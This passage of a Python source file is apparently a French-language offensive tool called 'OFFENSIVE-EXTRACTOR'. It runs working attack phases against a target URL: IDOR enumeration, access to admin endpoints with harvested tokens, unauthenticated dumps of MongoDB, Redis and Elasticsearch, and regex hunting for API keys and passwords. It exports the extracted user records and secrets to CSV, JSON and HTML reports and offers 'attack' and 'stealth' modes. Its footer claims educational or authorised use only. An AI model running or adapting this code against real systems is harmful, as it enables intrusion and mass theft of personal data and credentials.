                            print(f"    {self._c('🔴', 'red')} ID {i} → {len(info['body'])}o (non-JSON)")
                elif info['status'] == 404:
                    errors += 1
                    if errors > 5 and not extracted_objects:
                        break
                time.sleep(self.config['delay'] * 0.5)

            if extracted_objects:
                self.results['idor_data'].append({
                    'pattern': pattern,
                    'count': len(extracted_objects),
                    'objects': extracted_objects,
                })
                m.evidence.append({'pattern': pattern, 'count': len(extracted_objects)})
                self._log_finding('idor', f'IDOR sur {pattern} : {len(extracted_objects)} objets')
                print(f"  {self._c('✓', 'green')} {len(extracted_objects)} objets extraits")
                self._extract_users_from_idor(extracted_objects)

        m.data_extracted['objects_count'] = sum(x['count'] for x in self.results['idor_data'])
        m.end()
        if m.successes > 0:
            m.confidence = 'high'
        else:
            m.confidence = 'high'
            m.failure_reason = 'aucun IDOR détecté — autorisations correctement vérifiées'

        print(f"\n  {self._c('✓', 'green')} {m.successes}/{m.attempts} requêtes IDOR réussies")
        print(f"      {m.data_extracted.get('objects_count', 0)} objet(s) extrait(s)")

    def _auth_headers(self):
        if not self.results['tokens']:
            return {}
        token = self.results['tokens'][0]['token']
        return {
            'Authorization': f'Bearer {token}',
            'X-Auth-Token': token,
            'Cookie': f'token={token}; session={token}',
        }

    def _extract_users_from_idor(self, objects):
        for obj in objects:
            data = obj.get('data')
            if isinstance(data, dict):
                if 'data' in data and isinstance(data['data'], dict):
                    data = data['data']
                if 'user' in data and isinstance(data['user'], dict):
                    data = data['user']
                if any(k in str(data).lower() for k in ['email', 'username', 'password']):
                    self.results['extracted_users'].append(data)

    # ==================== PHASE 6 : ADMIN ====================

    def phase_6_admin_exploit(self):
        m = self.metrics['admin']
        m.start()
        self._section("PHASE 6 — ADMIN EXPLOITATION")

        auth_headers = self._auth_headers()
        if not auth_headers:
            print(f"  {self._c('ℹ', 'blue')} Aucun token — test sans auth")

        endpoints_to_test = ADMIN_ENDPOINTS + [
            ep for ep in self.results['endpoints']
            if 'admin' in ep.lower() or 'export' in ep.lower() or 'dump' in ep.lower()
        ]

        for ep in endpoints_to_test[:40]:
            m.attempts += 1
            url = urljoin(self.base_url, ep)
            info = self._request(url, headers=auth_headers)

            if info['status'] == 200 and info['body']:
                body = info['body']
                if len(body) < 200 and 'not found' in body.lower():
                    continue

                try:
                    data = json.loads(body)
                except Exception:
                    data = body[:5000]

                m.successes += 1
                self.results['admin_data'].append({
                    'endpoint': ep, 'url': url, 'status': info['status'],
                    'size': info['size'], 'data': data,
                })
                m.evidence.append({'endpoint': ep, 'size': info['size']})
                print(f"  {self._c('🔴', 'red')} {ep} → {info['size']}o")
                self._log_finding('admin_endpoint', f'{ep} accessible',
                                  {'endpoint': ep, 'size': info['size']})

                if isinstance(data, dict):
                    self._harvest_users(data)
                elif isinstance(data, list):
                    for item in data[:100]:
                        if isinstance(item, dict):
                            self._harvest_users(item)

            time.sleep(self.config['delay'])

        m.data_extracted['endpoints_accessible'] = len(self.results['admin_data'])
        m.end()
        if m.successes > 0:
            m.confidence = 'high'
        else:
            m.confidence = 'high'
            m.failure_reason = 'aucun endpoint admin accessible (protection correcte)'

        print(f"\n  {self._c('✓', 'green')} {m.successes}/{m.attempts} endpoint(s) accessible(s)")

    def _harvest_users(self, data):
        if isinstance(data, dict):
            keys_lower = [k.lower() for k in data.keys()]
            if any(k in keys_lower for k in ['email', 'username', 'password', 'password_hash']):
                self.results['extracted_users'].append(data)
            else:
                for v in data.values():
                    if isinstance(v, (dict, list)):
                        self._harvest_users(v)
        elif isinstance(data, list):
            for item in data[:200]:
                self._harvest_users(item)

    # ==================== PHASE 7 : SERVICES ====================

    def phase_7_services(self):
        m = self.metrics['services']
        m.start()
        self._section("PHASE 7 — SERVICES EXPOSÉS")

        services = [
            (27017, 'MongoDB'), (6379, 'Redis'), (9200, 'Elasticsearch'),
            (5432, 'PostgreSQL'), (3306, 'MySQL'), (11211, 'Memcached'),
            (5984, 'CouchDB'), (8086, 'InfluxDB'), (2379, 'etcd'),
        ]

        host = self.target_host
        for port, name in services:
            m.attempts += 1
            if self._check_port_open(host, port, timeout=3):
                m.successes += 1
                print(f"  {self._c('🔴', 'red')} {name} port {port} OUVERT")
                self.results['services_open'].append({'port': port, 'service': name})
                m.evidence.append({'port': port, 'service': name})
                self._log_finding('service_open', f'{name} ouvert sur {host}:{port}')

                if port == 27017:
                    self._exploit_mongodb(host, port)
                elif port == 6379:
                    self._exploit_redis(host, port)
                elif port == 9200:
                    self._exploit_elasticsearch(host, port)
            else:
                print(f"  {self._c('dim', 'dim')} {name} port {port} fermé")

        m.end()
        if m.successes > 0:
            m.confidence = 'high'
        else:
            m.confidence = 'high'
            m.failure_reason = 'tous les ports sensibles sont fermés (bonne isolation)'

        print(f"\n  {self._c('✓', 'green')} {m.successes}/{m.attempts} service(s) ouvert(s)")

    def _check_port_open(self, host, port, timeout=3):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            result = s.connect_ex((host, port))
            s.close()
            return result == 0
        except Exception:
            return False

    def _exploit_mongodb(self, host, port):
        print(f"    {self._c('🎯', 'yellow')} Tentative MongoDB...")
        if not PYMONGO_AVAILABLE:
            print(f"    {self._c('ℹ', 'blue')} pymongo non installé")
            return
        try:
            client = MongoClient(f'mongodb://{host}:{port}/',
                                 serverSelectionTimeoutMS=5000)
            dbs = client.list_database_names()
            print(f"    {self._c('💥', 'red', bold=True)} MongoDB SANS AUTH — {len(dbs)} DB(s)")

            for db_name in dbs:
                if db_name in ['admin', 'local', 'config']:
                    continue
                try:
                    db = client[db_name]
                    collections = db.list_collection_names()
                    print(f"    📁 '{db_name}' : {len(collections)} collections")

                    dump_data = {'db': db_name, 'collections': {}}
                    for coll in collections:
                        try:
                            docs = list(db[coll].find().limit(1000))
                            for d in docs:
                                for k, v in list(d.items()):
                                    if hasattr(v, '__str__') and not isinstance(
                                        v, (str, int, float, bool, type(None), list, dict)
                                    ):
                                        d[k] = str(v)
                            dump_data['collections'][coll] = docs
                            print(f"      • {coll} : {len(docs)} docs")
                        except Exception as e:
                            print(f"      ✗ {coll}: {e}")

                    self.results['mongo_dumps'].append(dump_data)
                    self.metrics['services'].data_extracted['mongo_dbs'] = \
                        self.metrics['services'].data_extracted.get('mongo_dbs', 0) + 1
                except Exception as e:
                    print(f"    ✗ DB {db_name}: {e}")

            client.close()
        except Exception as e:
            print(f"    ✗ {e}")

    def _exploit_redis(self, host, port):
        print(f"    {self._c('🎯', 'yellow')} Tentative Redis...")
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((host, port))
            s.send(b'PING\r\n')
            resp = s.recv(100)
            if b'PONG' in resp:
                print(f"    {self._c('💥', 'red', bold=True)} Redis SANS AUTH")
                s.send(b'KEYS *\r\n')
                time.sleep(0.3)
                data = s.recv(10000)
                keys = data.decode(errors='ignore').split('\r\n')
                print(f"    {len([k for k in keys if k])} clés")
            s.close()
        except Exception as e:
            print(f"    ✗ {e}")

    def _exploit_elasticsearch(self, host, port):
        print(f"    {self._c('🎯', 'yellow')} Tentative Elasticsearch...")
        try:
            r = requests.get(f'http://{host}:{port}/_cat/indices?format=json', timeout=5)
            if r.status_code == 200:
                indices = r.json()
                print(f"    {self._c('💥', 'red', bold=True)} ES SANS AUTH — {len(indices)} index")
        except Exception as e:
            print(f"    ✗ {e}")

    # ==================== PHASE 8 : HUNT ====================

    def phase_8_hunt(self):
        m = self.metrics['hunt']
        m.start()
        self._section("PHASE 8 — HUNT (secrets, credentials)")

        all_texts = []
        for req in self.all_requests:
            if req.get('body'):
                all_texts.append((req['url'], req['body']))
        for t in self.results['tokens']:
            all_texts.append((f"token:{t.get('source')}", t.get('token', '')))
        for a in self.results['admin_data']:
            try:
                all_texts.append((a['endpoint'], json.dumps(a['data'], default=str)))
            except Exception:
                pass
        for idor in self.results['idor_data']:
            for obj in idor.get('objects', []):
                try:
                    all_texts.append((f"idor:{idor['pattern']}#{obj['id']}",
                                      json.dumps(obj['data'], default=str)))
                except Exception:
                    pass

        for root, _, files in os.walk(self._output_dir()):
            for fname in files:
                fpath = os.path.join(root, fname)
                try:
                    with open(fpath, 'r', errors='ignore') as f:
                        all_texts.append((fpath, f.read(1000000)))
                except Exception:
                    pass

        seen_flags = set()
        seen_secrets = set()
        for source, text in all_texts:
            for name, pattern in HUNT_PATTERNS.items():
                m.attempts += 1
                try:
                    matches = re.findall(pattern, text, re.IGNORECASE)
                except Exception:
                    continue
                for match in matches:
                    m_str = match if isinstance(match, str) else str(match)
                    if name == 'flag':
                        if m_str not in seen_flags:
                            seen_flags.add(m_str)
                            m.successes += 1
                            self.results['flags'].append({'flag': m_str, 'source': source})
                            print(f"  {self._c('🚩', 'red', bold=True)} {m_str}")
                    elif name in ('password', 'jwt', 'private_key', 'aws_key',
                                  'stripe_key', 'github_token', 'google_api',
                                  'mongo_uri', 'postgres_uri', 'mysql_uri',
                                  'redis_uri', 'slack_token'):
                        key = (name, m_str[:100])
                        if key not in seen_secrets:
                            seen_secrets.add(key)
                            m.successes += 1
                            self.results['secrets'].append({
                                'type': name, 'value': m_str[:300],
                                'source': source[:200],
                            })

        m.data_extracted['flags_found'] = len(self.results['flags'])
        m.data_extracted['secrets_found'] = len(self.results['secrets'])
        m.end()
        m.confidence = 'high'

        print(f"\n  {self._c('✓', 'green')} {m.successes}/{m.attempts} patterns trouvés")

    # ==================== MÉTRIQUES GLOBALES ====================

    def compute_site_robustness(self) -> Dict:
        """Score de robustesse du site (0-100, 100 = très robuste)."""
        score = 100
        details = []
        critical_vulns = 0
        high_vulns = 0
        medium_vulns = 0

        # Pénalités par vecteur
        penalties = {
            'auth_nosql': {'success': -25, 'label': 'Auth NoSQL bypassable'},
            'sensitive_files': {'success': -20, 'label': 'Fichiers sensibles exposés'},
            'idor': {'success': -20, 'label': 'IDOR exploitable'},
            'admin': {'success': -15, 'label': 'Endpoints admin accessibles'},
            'jwt': {'success': -15, 'label': 'JWT weak secret'},
            'services': {'success': -20, 'label': 'Services exposés'},
            'discovery': {'success': -5, 'label': 'Discovery facile'},
            'hunt': {'success': -5, 'label': 'Secrets en clair'},
        }

        for name, metrics in self.metrics.items():
            if metrics.successes > 0 and name in penalties:
                penalty = penalties[name]['success']
                score += penalty
                details.append({
                    'vector': name,
                    'label': penalties[name]['label'],
                    'penalty': penalty,
                })
                if penalty <= -20:
                    critical_vulns += 1
                elif penalty <= -15:
                    high_vulns += 1
                else:
                    medium_vulns += 1

        score = max(0, min(100, score))

        if score >= 80:
            verdict = 'ROBUSTE'
            color = 'green'
        elif score >= 60:
            verdict = 'CORRECT'
            color = 'yellow'
        elif score >= 40:
            verdict = 'FAIBLE'
            color = 'red'
        else:
            verdict = 'CRITIQUE'
            color = 'red'

        return {
            'score': score,
            'verdict': verdict,
            'color': color,
            'critical_vulns': critical_vulns,
            'high_vulns': high_vulns,
            'medium_vulns': medium_vulns,
            'details': details,
        }

    def compute_program_efficiency(self) -> Dict:
        """Score d'efficacité du programme (0-100)."""
        total_attempts = sum(m.attempts for m in self.metrics.values())
        total_successes = sum(m.successes for m in self.metrics.values())
        vectors_tested = len([m for m in self.metrics.values() if m.attempts > 0])
        vectors_successful = len([m for m in self.metrics.values() if m.successes > 0])

        # Score basé sur :
        # 40% : couverture (vecteurs testés / 8)
        # 30% : taux de succès
        # 30% : extraction réelle de données
        coverage_score = (vectors_tested / 8) * 40
        success_rate = (total_successes / total_attempts * 100) if total_attempts > 0 else 0
        success_score = min(30, success_rate * 0.3)

        data_extracted = (
            len(self.results['extracted_users']) +
            len(self.results['secrets']) +
            len(self.results['idor_data']) +
            len(self.results['admin_data']) +
            len(self.results['mongo_dumps'])
        )
        data_score = min(30, data_extracted * 2)

        score = round(coverage_score + success_score + data_score, 1)

        # Limites identifiées
        limits = []
        for name, metrics in self.metrics.items():
            if metrics.successes == 0 and metrics.attempts > 0:
                if metrics.confidence == 'high' and metrics.failure_reason:
                    # Échec confirmé — site robuste, programme OK
                    pass
                else:
                    # Limite potentielle du programme
                    limits.append({
                        'vector': name,
                        'reason': metrics.failure_reason or 'raison inconnue',
                        'suggestion': self._suggest_improvement(name),
                    })

        return {
            'score': score,
            'vectors_tested': vectors_tested,
            'vectors_successful': vectors_successful,
            'total_attempts': total_attempts,
            'total_successes': total_successes,
            'success_rate': round(success_rate, 1),
            'data_extracted_count': data_extracted,
            'limits': limits,
        }

    def _suggest_improvement(self, vector_name):
        suggestions = {
            'jwt': 'Ajouter support RS256/RS512 + tests de confusion RS→HS',
            'auth_nosql': 'Ajouter payloads imbriqués ($elemMatch, $not.$ne) + tests time-based',
            'idor': 'Augmenter max_idor_ids + tester UUID pattern',
            'services': 'Ajouter PostgreSQL, MySQL direct + tests de credentials par défaut',
            'sensitive_files': 'Étendre wordlist avec SecLists',
            'admin': 'Étendre la liste des endpoints admin connus',
            'discovery': 'Ajouter parsing de sitemap.xml et robots.txt avancé',
            'hunt': 'Ajouter patterns : Discord, Telegram, Firebase, Twilio',
        }
        return suggestions.get(vector_name, 'Analyser manuellement le vecteur')

    # ==================== SAVE / REPORT ====================

    def _output_dir(self):
        d = f"{self.config['output_dir']}/{self.target_domain}"
        os.makedirs(d, exist_ok=True)
        return d

    def save_results(self):
        out = self._output_dir()
        site_robustness = self.compute_site_robustness()
        program_efficiency = self.compute_program_efficiency()

        full_report = {
            'target': self.target_url,
            'timestamp': self.results['timestamp'],
            'mode': self.config['mode'],
            'site_robustness': site_robustness,
            'program_efficiency': program_efficiency,
            'metrics_per_vector': {k: v.to_dict() for k, v in self.metrics.items()},
            'results': self.results,
            'findings': self.findings,
            'total_requests': len(self.all_requests),
        }

        json_path = f"{out}/extraction_report.json"
        with open(json_path, 'w', encoding='utf-8') as f:
            json.dump(full_report, f, indent=2, default=str)

        # Users CSV
        if self.results['extracted_users']:
            users_path = f"{out}/extracted_users.json"
            with open(users_path, 'w', encoding='utf-8') as f:
                json.dump(self.results['extracted_users'], f, indent=2, default=str)

            csv_path = f"{out}/extracted_users.csv"
            all_keys = set()
            for u in self.results['extracted_users'][:1000]:
                if isinstance(u, dict):
                    all_keys.update(u.keys())
            if all_keys:
                with open(csv_path, 'w', newline='', encoding='utf-8') as f:
                    w = csv.DictWriter(f, fieldnames=list(all_keys), extrasaction='ignore')
                    w.writeheader()
                    for u in self.results['extracted_users'][:1000]:
                        if isinstance(u, dict):
                            w.writerow(u)

        # Mongo dumps
        for i, dump in enumerate(self.results['mongo_dumps']):
            db_name = dump.get('db', f'db_{i}').replace('/', '_')
            path = f"{out}/mongo_{db_name}.json"
            with open(path, 'w', encoding='utf-8') as f:
                json.dump(dump, f, indent=2, default=str)

        # Flags
        if self.results['flags']:
            with open(f"{out}/flags.txt", 'w', encoding='utf-8') as f:
                for fl in self.results['flags']:
                    f.write(f"{fl['flag']}    # {fl['source']}\n")

        # Secrets
        if self.results['secrets']:
            with open(f"{out}/secrets.txt", 'w', encoding='utf-8') as f:
                for sec in self.results['secrets']:
                    f.write(f"[{sec.get('type', '?')}] {sec.get('value', '')}    # {sec.get('source', '?')}\n")

        # IDOR + admin
        if self.results['idor_data']:
            with open(f"{out}/idor_extracted.json", 'w', encoding='utf-8') as f:
                json.dump(self.results['idor_data'], f, indent=2, default=str)
        if self.results['admin_data']:
            with open(f"{out}/admin_extracted.json", 'w', encoding='utf-8') as f:
                json.dump(self.results['admin_data'], f, indent=2, default=str)

        # TXT summary
        self._write_txt_summary(out, site_robustness, program_efficiency)

        # HTML
        self._write_html_report(out, site_robustness, program_efficiency)

        return out

    def _write_txt_summary(self, out, site_r, prog_e):
        lines = []
        lines.append("=" * 78)
        lines.append("  OFFENSIVE-EXTRACTOR — RAPPORT D'EXTRACTION")
        lines.append("=" * 78)
        lines.append(f"  Cible    : {self.target_url}")
        lines.append(f"  Date     : {self.results['timestamp']}")
        lines.append(f"  Mode     : {self.config['mode']}")
        lines.append(f"  Requêtes : {len(self.all_requests)}")
        lines.append("")

        lines.append("-" * 78)
        lines.append("  ROBUSTESSE DU SITE")
        lines.append("-" * 78)
        lines.append(f"  Score         : {site_r['score']}/100")
        lines.append(f"  Verdict       : {site_r['verdict']}")
        lines.append(f"  Critiques     : {site_r['critical_vulns']}")
        lines.append(f"  Élevées       : {site_r['high_vulns']}")
        lines.append(f"  Moyennes      : {site_r['medium_vulns']}")
        lines.append("")
        if site_r['details']:
            lines.append("  Vulnérabilités détectées :")
            for d in site_r['details']:
                lines.append(f"    • {d['label']} ({d['penalty']})")
        else:
            lines.append("  Aucune vulnérabilité détectée — site robuste")
        lines.append("")

        lines.append("-" * 78)
        lines.append("  EFFICACITÉ DU PROGRAMME")
        lines.append("-" * 78)
        lines.append(f"  Score                : {prog_e['score']}/100")
        lines.append(f"  Vecteurs testés      : {prog_e['vectors_tested']}/8")
        lines.append(f"  Vecteurs efficaces   : {prog_e['vectors_successful']}/8")
        lines.append(f"  Taux de succès       : {prog_e['success_rate']}%")
        lines.append(f"  Données extraites    : {prog_e['data_extracted_count']}")
        lines.append("")

        if prog_e['limits']:
            lines.append("  Limites identifiées du programme :")
            for lim in prog_e['limits']:
                lines.append(f"    • [{lim['vector']}] {lim['reason']}")
                lines.append(f"      → {lim['suggestion']}")
            lines.append("")

        lines.append("-" * 78)
        lines.append("  MATRICE DE CONFRONTATION")
        lines.append("-" * 78)
        lines.append(f"  {'Vecteur':<20} | {'Tentatives':>10} | {'Succès':>7} | {'Résultat':<15}")
        lines.append("-" * 78)
        for name, m in self.metrics.items():
            result = "VULNÉRABLE" if m.successes > 0 else "PROTÉGÉ"
            lines.append(f"  {m.name:<20} | {m.attempts:>10} | {m.successes:>7} | {result:<15}")
        lines.append("")

        lines.append("-" * 78)
        lines.append("  DONNÉES EXTRAITES")
        lines.append("-" * 78)
        lines.append(f"  Users extraits     : {len(self.results['extracted_users'])}")
        lines.append(f"  Endpoints admin    : {len(self.results['admin_data'])}")
        lines.append(f"  Objets IDOR        : {sum(x['count'] for x in self.results['idor_data'])}")
        lines.append(f"  MongoDB dumps      : {len(self.results['mongo_dumps'])}")
        lines.append(f"  Fichiers sensibles : {len(self.results['sensitive_files'])}")
        lines.append(f"  Secrets            : {len(self.results['secrets'])}")
        lines.append(f"  Flags              : {len(self.results['flags'])}")
        lines.append("")

        lines.append("=" * 78)

        txt_path = f"{out}/extraction_summary.txt"
        with open(txt_path, 'w', encoding='utf-8') as f:
            f.write("\n".join(lines))

    def _write_html_report(self, out, site_r, prog_e):
        html = f"""<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<title>Offensive Extractor — Rapport</title>
<style>
body {{ font-family: -apple-system, Arial, sans-serif; background: #0d1117; color: #c9d1d9; margin: 0; padding: 20px; }}
.container {{ max-width: 1200px; margin: auto; }}
h1 {{ color: #58a6ff; border-bottom: 2px solid #30363d; padding-bottom: 10px; }}
h2 {{ color: #7ee787; margin-top: 30px; }}
h3 {{ color: #79c0ff; }}
.meta {{ background: #161b22; padding: 15px; border-radius: 8px; border: 1px solid #30363d; }}
.scores {{ display: flex; gap: 20px; margin: 20px 0; }}
.score-box {{ flex: 1; background: #161b22; padding: 20px; border-radius: 8px; border: 2px solid #30363d; text-align: center; }}
.score-value {{ font-size: 48px; font-weight: bold; }}
.score-label {{ color: #8b949e; font-size: 14px; margin-top: 5px; }}
.score-verdict {{ font-size: 18px; margin-top: 10px; font-weight: bold; }}
.score-robust .score-value {{ color: {self._score_color(site_r['score'])}; }}
.score-efficient .score-value {{ color: {self._score_color(prog_e['score'])}; }}
.stat {{ display: inline-block; background: #1f6feb; padding: 8px 16px; border-radius: 6px; margin: 5px 10px 5px 0; font-weight: bold; }}
.stat.danger {{ background: #da3633; }}
.stat.warn {{ background: #d29922; }}
.stat.success {{ background: #238636; }}
table {{ width: 100%; border-collapse: collapse; margin-top: 10px; }}
th {{ background: #21262d; padding: 10px; text-align: left; color: #7ee787; }}
td {{ padding: 8px; border-bottom: 1px solid #30363d; font-size: 13px; }}
tr.vuln td {{ color: #f85149; }}
tr.protected td {{ color: #7ee787; }}
pre {{ background: #0d1117; padding: 10px; border-radius: 4px; overflow-x: auto; color: #7ee787; font-size: 12px; max-height: 300px; }}
code {{ background: #161b22; padding: 2px 6px; border-radius: 3px; color: #79c0ff; }}
.finding {{ background: #161b22; padding: 15px; margin: 15px 0; border-left: 4px solid #f85149; border-radius: 6px; }}
.finding.ok {{ border-left-color: #7ee787; }}
.footer {{ text-align: center; margin-top: 40px; color: #6e7681; font-size: 12px; }}
</style>
</head>
<body>
<div class="container">
<h1>🎯 OFFENSIVE-EXTRACTOR — Rapport d'extraction</h1>

<div class="meta">
<p><strong>Cible :</strong> <code>{self.target_url}</code></p>
<p><strong>Date :</strong> {self.results['timestamp']}</p>
<p><strong>Mode :</strong> {self.config['mode']}</p>
<p><strong>Requêtes envoyées :</strong> {len(self.all_requests)}</p>
</div>

<h2>📊 Scores</h2>
<div class="scores">
  <div class="score-box score-robust">
    <div class="score-value">{site_r['score']}</div>
    <div class="score-label">Robustesse du SITE</div>
    <div class="score-verdict" style="color: {self._score_color(site_r['score'])}">{site_r['verdict']}</div>
  </div>
  <div class="score-box score-efficient">
    <div class="score-value">{prog_e['score']}</div>
    <div class="score-label">Efficacité du PROGRAMME</div>
    <div class="score-verdict" style="color: {self._score_color(prog_e['score'])}">
      {prog_e['vectors_successful']}/{prog_e['vectors_tested']} vecteurs efficaces
    </div>
  </div>
</div>

<h2>🔍 Matrice de confrontation</h2>
<table>
<tr><th>Vecteur</th><th>Tentatives</th><th>Succès</th><th>Résultat</th><th>Durée</th><th>Raison d'échec</th></tr>
"""
        for name, m in self.metrics.items():
            result = "VULNÉRABLE" if m.successes > 0 else "PROTÉGÉ"
            cls = "vuln" if m.successes > 0 else "protected"
            reason = m.failure_reason or "-"
            html += f'<tr class="{cls}"><td>{m.name}</td><td>{m.attempts}</td>'
            html += f'<td>{m.successes}</td><td><strong>{result}</strong></td>'
            html += f'<td>{m.duration}s</td><td>{reason}</td></tr>'
        html += "</table>"

        # Section robustesse site
        html += f"""
<h2>🛡️ Robustesse du site — Score {site_r['score']}/100</h2>
<p>
<span class="stat {'danger' if site_r['critical_vulns'] > 0 else ''}">
Critiques : {site_r['critical_vulns']}</span>
<span class="stat {'warn' if site_r['high_vulns'] > 0 else ''}">
Élevées : {site_r['high_vulns']}</span>
<span class="stat">Moyennes : {site_r['medium_vulns']}</span>
</p>
"""
        if site_r['details']:
            html += "<h3>Vulnérabilités détectées</h3><ul>"
            for d in site_r['details']:
                html += f"<li><strong>{d['label']}</strong> ({d['penalty']})</li>"
            html += "</ul>"
        else:
            html += "<p>✅ Aucune vulnérabilité détectée — le site est robuste aux tests effectués.</p>"

        # Section efficacité programme
        html += f"""
<h2>⚙️ Efficacité du programme — Score {prog_e['score']}/100</h2>
<p>
<span class="stat success">Vecteurs testés : {prog_e['vectors_tested']}/8</span>
<span class="stat success">Vecteurs efficaces : {prog_e['vectors_successful']}/8</span>
<span class="stat warn">Taux de succès : {prog_e['success_rate']}%</span>
<span class="stat">Données extraites : {prog_e['data_extracted_count']}</span>
</p>
"""
        if prog_e['limits']:
            html += "<h3>Limites identifiées du programme</h3>"
            for lim in prog_e['limits']:
                html += f'<div class="finding"><strong>[{lim["vector"]}]</strong> {lim["reason"]}<br>'
                html += f'<em>→ {lim["suggestion"]}</em></div>'

        # Données extraites
        html += f"""
<h2>💾 Données extraites</h2>
<table>
<tr><th>Type</th><th>Quantité</th></tr>
<tr><td>Utilisateurs</td><td><strong>{len(self.results['extracted_users'])}</strong></td></tr>
<tr><td>Endpoints admin</td><td><strong>{len(self.results['admin_data'])}</strong></td></tr>
<tr><td>Objets IDOR</td><td><strong>{sum(x['count'] for x in self.results['idor_data'])}</strong></td></tr>
<tr><td>MongoDB dumps</td><td><strong>{len(self.results['mongo_dumps'])}</strong></td></tr>
<tr><td>Fichiers sensibles</td><td><strong>{len(self.results['sensitive_files'])}</strong></td></tr>
<tr><td>Secrets / clés API</td><td><strong>{len(self.results['secrets'])}</strong></td></tr>
<tr><td>Flags</td><td><strong>{len(self.results['flags'])}</strong></td></tr>
</table>
"""

        # Users extraits (aperçu)
        if self.results['extracted_users']:
            html += f"<h3>Utilisateurs extraits ({len(self.results['extracted_users'])})</h3>"
            html += "<table><tr><th>#</th><th>Username</th><th>Email</th><th>Role</th></tr>"
            for i, u in enumerate(self.results['extracted_users'][:50], 1):
                if isinstance(u, dict):
                    uname = u.get('username', '?')
                    email = u.get('email', '?')
                    role = u.get('role', '?')
                    html += f"<tr><td>{i}</td><td>{uname}</td><td>{email}</td><td>{role}</td></tr>"
            html += "</table>"

        html += f"""
<div class="footer">
OFFENSIVE-EXTRACTOR v1.0 — {self.results['timestamp']}<br>
Usage éducatif / pentest autorisé uniquement.
</div>
</div>
</body>
</html>"""

        with open(f"{out}/report.html", 'w', encoding='utf-8') as f:
            f.write(html)

    def _score_color(self, score):
        if score >= 80:
            return '#3fb950'
        elif score >= 60:
            return '#d29922'
        elif score >= 40:
            return '#f85149'
        return '#da3633'

    # ==================== ORCHESTRATEUR ====================

    def run(self, phases=None, **kwargs):
        phases = phases or [1, 2, 3, 4, 5, 6, 7, 8]

        print(f"\n{self._c('🎯 Cible :', 'bold')} {self.target_url}")
        print(f"{self._c('📅 Date  :', 'bold')} {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"{self._c('🧩 Mode  :', 'bold')} {self.config['mode']}")
        print(f"{self._c('📊 Phases:', 'bold')} {phases}")

        try:
            if 1 in phases:
                self.phase_1_discovery()
            if 2 in phases:
                self.phase_2_sensitive_files()
            if 3 in phases:
                self.phase_3_auth_bypass(
                    login_path=kwargs.get('login_path', '/api/login'),
                    username_field=kwargs.get('username_field', 'username'),
                    password_field=kwargs.get('password_field', 'password'),
                    extra_static=kwargs.get('extra_static'),
                )
            if 4 in phases:
                self.phase_4_jwt_attacks()
            if 5 in phases:
                self.phase_5_idor()
            if 6 in phases:
                self.phase_6_admin_exploit()
            if 7 in phases:
                self.phase_7_services()
            if 8 in phases:
                self.phase_8_hunt()
        except KeyboardInterrupt:
            print(f"\n{self._c('⚠️ Interrompu', 'yellow')}")

        self._print_summary()
        out = self.save_results()

        print(f"\n{self._c('📁 Résultats sauvegardés :', 'bold')} {out}")
        print(f"  • extraction_report.json    — données + métriques complètes")
        print(f"  • extraction_summary.txt    — résumé lisible")
        print(f"  • report.html               — rapport visuel double-lecture")
        if self.results['extracted_users']:
            print(f"  • extracted_users.json/csv  — {len(self.results['extracted_users'])} users")
        if self.results['mongo_dumps']:
            print(f"  • mongo_*.json              — {len(self.results['mongo_dumps'])} DB")
        if self.results['flags']:
            print(f"  • flags.txt                 — {len(self.results['flags'])} flags")

    def _print_summary(self):
        site_r = self.compute_site_robustness()
        prog_e = self.compute_program_efficiency()

        self._section("RÉSUMÉ — DOUBLE MÉTRIQUE")

        print(f"\n  {self._c('🛡️ ROBUSTESSE DU SITE', 'bold')}")
        print(f"     Score   : {self._c(str(site_r['score']) + '/100', site_r['color'], bold=True)}")
        print(f"     Verdict : {self._c(site_r['verdict'], site_r['color'], bold=True)}")
        print(f"     Critiques : {site_r['critical_vulns']} | Élevées : {site_r['high_vulns']} | Moyennes : {site_r['medium_vulns']}")

        print(f"\n  {self._c('⚙️ EFFICACITÉ DU PROGRAMME', 'bold')}")
        print(f"     Score   : {self._c(str(prog_e['score']) + '/100', 'cyan', bold=True)}")
        print(f"     Vecteurs testés/efficaces : {prog_e['vectors_tested']}/{prog_e['vectors_successful']}")
        print(f"     Taux de succès : {prog_e['success_rate']}%")

        print(f"\n  {self._c('📊 MATRICE', 'bold')}")
        for name, m in self.metrics.items():
            status = self._c('VULNÉRABLE', 'red') if m.successes > 0 else self._c('PROTÉGÉ', 'green')
            print(f"     {m.name:<25} {status} ({m.successes}/{m.attempts})")

        print(f"\n  {self._c('💾 DONNÉES EXTRAITES', 'bold')}")
        print(f"     Users     : {len(self.results['extracted_users'])}")
        print(f"     IDOR obj  : {sum(x['count'] for x in self.results['idor_data'])}")
        print(f"     Admin ep  : {len(self.results['admin_data'])}")
        print(f"     MongoDB   : {len(self.results['mongo_dumps'])}")
        print(f"     Secrets   : {len(self.results['secrets'])}")
        print(f"     Flags     : {len(self.results['flags'])}")

        if prog_e['limits']:
            print(f"\n  {self._c('⚠️ LIMITES DU PROGRAMME', 'yellow', bold=True)}")
            for lim in prog_e['limits']:
                print(f"     • {lim['vector']}: {lim['reason']}")
                print(f"       → {lim['suggestion']}")


# ==================== MENU INTERACTIF ====================

def interactive_menu():
    print("\n" + "=" * 78)
    print("  OFFENSIVE-EXTRACTOR — CONFIGURATION")
    print("=" * 78)
    url = input("  URL cible : ").strip()
    if not url:
        return
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url

    print("\n  Mode :")
    print("    [1] attack  — extraction agressive (IDOR 200 IDs)")
    print("    [2] stealth — discret (IDOR 50 IDs, délais)")
    print("    [3] hybrid  — par défaut")
    mode_choice = input("  Mode [3] : ").strip() or "3"
    mode = {'1': 'attack', '2': 'stealth', '3': 'hybrid'}.get(mode_choice, 'hybrid')

    print("\n  Phases :")
    print("  [0] Toutes (recommandé)")
    print("  [1-8] Phases spécifiques (ex: 1,2,3)")
    choice = input("  Choix [0] : ").strip() or "0"

    if choice == '0':
        phases = [1, 2, 3, 4, 5, 6, 7, 8]
    else:
        phases = [int(x.strip()) for x in choice.split(',') if x.strip().isdigit()]
        phases = [p for p in phases if 1 <= p <= 8]

    login_path = '/api/login'
    uf, pf = "username", "password"
    if 3 in phases:
        lp = input(f"\n  Login endpoint [{login_path}] : ").strip()
        if lp:
            login_path = lp
